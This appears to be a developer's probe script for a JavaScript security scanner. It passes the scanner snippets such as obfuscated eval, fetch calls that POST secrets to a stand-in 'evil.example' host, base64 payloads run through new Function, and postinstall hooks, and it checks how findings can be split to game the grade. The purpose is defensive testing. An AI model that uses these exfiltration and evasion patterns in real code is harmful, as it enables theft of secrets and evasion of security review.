import { scanContent } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/index.js';
import { grade } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/report.js';

const show = (label, src, path='lib/app.js') => {
  const f = scanContent(src, path);
  console.log('=== ' + label);
  console.log(JSON.stringify(f.map(x => ({id:x.id, sev:x.severity}))));
};

// A. indirect eval variants
show('A1 indirect eval (0,eval)', 'const run = (0, eval); run("process.exit(1)");');
show('A2 globalThis.eval', 'globalThis.eval(payload);');
show('A3 bare Function ctor (no new)', 'const mk = Function("body", "return body");');
show('A4 aliased eval', 'const e = eval; e(userStr);');

// B. computed property / aliased network + cred
show('B1 aliased fetch', 'const g = globalThis.fetch;\ng("https://collect.evil.example/x", {method:"POST", body: secret});');
show('B2 third-party client', 'import axios from "axios";\naxios.post(process.env.EXFIL_URL, data);');
show('B3 computed env spread', 'const copy = { ...process["env"] };');
show('B4 getBuiltinModule', 'const cp = process.getBuiltinModule("child_process");\ncp.execSync(cmd);');
show('B5 bracket net call', 'const https = require(String.fromCharCode(104,116,116,112,115));');

// C. encoding tricks
show('C1 hex-escaped URL', 'fetch("\\x68\\x74\\x74\\x70\\x73://collect.evil.example/x");');
show('C2 unicode-escaped eval', '\\u0065val(code);');
show('C3 split b64 chunks', 'const p = b64a + b64b + b64c;\nnew Function(Buffer.from(p, "base64").toString("utf8"))();');
show('C4 setTimeout(atob)', 'setTimeout(atob(payload), 10);');

// D. maskComments desync via regex-literal quote
show('D1 regex-quote desync', "const re = /['\"]/;\neval(runsShell);");

// F. known-host exfil
show('F1 gist exfil', 'fetch("https://gist.github.com/" + tok, {method:"POST"});', 'src/up.js');

// G/H. FP probes
show('G1 regex .exec()', 'const m = /^(\\d+)/.exec(version);\nif (!m) return;');
show('H1 url concat FP', 'const base = "https://" + host + "/api";');
show('H2 env var FP', 'const token = process.env.GITHUB_TOKEN;');

// I. grade gaming arithmetic
const med = (i, fam) => ({ id:'X-'+i, ruleId:'r', family:fam, severity:'medium', message:'m', path:'src/f'+i+'.js', line:1, col:1, excerpt:'', excerptSha256:'', confidence:0.8 });
const sixMed = [0,1,2,3,4,5].map(i => med(i, 'NET'));
console.log('=== I1 six unrelated mediums -> grade', grade(sixMed).grade);
const lows = Array.from({length: 24}, (_, i) => ({ id:'L-'+i, ruleId:'r', family:'FS', severity:'low', message:'m', path:'src/l'+i+'.js', line:1, col:1, excerpt:'', excerptSha256:'', confidence:0.8 }));
console.log('=== I2 twenty-four lows -> grade', grade(lows).grade);
const credFile = { id:'CRED-003', ruleId:'r', family:'CRED', severity:'critical', message:'m', path:'lib/a.js', line:1, col:1, excerpt:'', excerptSha256:'', confidence:0.9 };
const netFile  = { id:'NET-001', ruleId:'r', family:'NET', severity:'high', message:'m', path:'lib/b.js', line:1, col:1, excerpt:'', excerptSha256:'', confidence:0.9 };
console.log('=== I3 cred+net split files -> gates', JSON.stringify(grade([credFile, netFile]).gates), 'grade', grade([credFile, netFile]).grade);

// J. hook evasion
show('J1 postinstall via node script', '{ "scripts": { "postinstall": "node ./scripts/setup.js" } }', 'package.json');

// K. skipped-file evasion
show('K1 oversized file', '// ' + 'x'.repeat(40) , 'lib/huge.js');
